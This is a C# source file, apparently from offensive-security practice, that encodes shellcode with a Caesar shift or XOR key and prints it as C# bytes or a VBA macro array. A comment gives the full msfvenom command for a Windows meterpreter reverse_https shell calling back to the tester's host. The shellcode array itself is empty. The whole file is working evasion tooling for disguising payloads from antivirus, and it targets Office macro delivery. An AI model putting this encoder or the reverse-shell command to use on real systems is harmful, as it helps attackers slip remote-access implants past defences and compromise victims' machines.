using System;
using System.Text;

namespace ObfShellCodeRunner
{
    class Program
    {
        static void Main(string[] args)
        {
            // Change the program to get args of shellcode and type of encryption/obfuscation
            Console.WriteLine("Shellcode Encryptor");

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[689] {
 };


            // Caesar(buf);
            XOR(buf);
            //MacroEncryptor.Caesar(buf);
            Console.Read();

        }

        static void Caesar(byte[] shellcode)
        {
            // Encryption routine
            byte[] encoded = new byte[shellcode.Length];
            uint key = 2;

            // The &0xff is to keep the shellcode in the Ascii range 
            for (int i = 0; i < shellcode.Length; i++)
            {
                // Decryption routine use: shellcode[i] - key
                encoded[i] = (byte)(((uint)shellcode[i] + key) & 0xff);
            }

            // Convert the bytearray to string so we can print it to console
            StringBuilder hex = new StringBuilder(encoded.Length * 2);

            foreach (byte b in encoded)
            {
                // 0x:2 -> 0 is the first byte and :x2 is 2 hex digits
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine($"Payload: {hex}");
        }

        static void XOR(byte[] shellcode)
        {
            // Encryption routine
            byte[] encoded = new byte[shellcode.Length];
            uint key = 2;

            // The &0xff is to keep the shellcode in the Ascii range 
            for (int i = 0; i < shellcode.Length; i++)
            {
                // Decryption routine is the same
                encoded[i] = (byte)(((uint)shellcode[i] ^ key) & 0xff);
            }

            // Convert the bytearray to string so we can print it to console
            StringBuilder hex = new StringBuilder(encoded.Length * 2);

            foreach (byte b in encoded)
            {
                // 0x:2 -> 0 is the first byte and :x2 is 2 hex digits
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine($"Payload: {hex}");

        }
    }

    class MacroEncryptor
    {
        public static void Caesar(byte[] shellcode)
        {
            // Encryption routine
            byte[] encoded = new byte[shellcode.Length];
            uint key = 2;
            uint counter = 0;

            // The &0xff is to keep the shellcode in the Ascii range 
            for (int i = 0; i < shellcode.Length; i++)
            {
                // Decryption routine use: shellcode[i] - key
                encoded[i] = (byte)(((uint)shellcode[i] + key) & 0xff);
            }

            // Convert the bytearray to string so we can print it to console
            StringBuilder hex = new StringBuilder(encoded.Length * 2);

            foreach (byte b in encoded)
            {
                // 0x:2 -> 0 is the first byte and :x2 is 2 hex digits
                hex.AppendFormat("{0:D}, ", b);
                counter++;

                if (counter % 50 == 0)
                {
                    hex.Append("_\n");
                }
            }

            // Removing 2 chars becuase ",\n"
            string payload = hex.ToString().Substring(0, hex.Length - 2);
            Console.WriteLine($"Shellcode = Array({payload})");
        }
    }
}
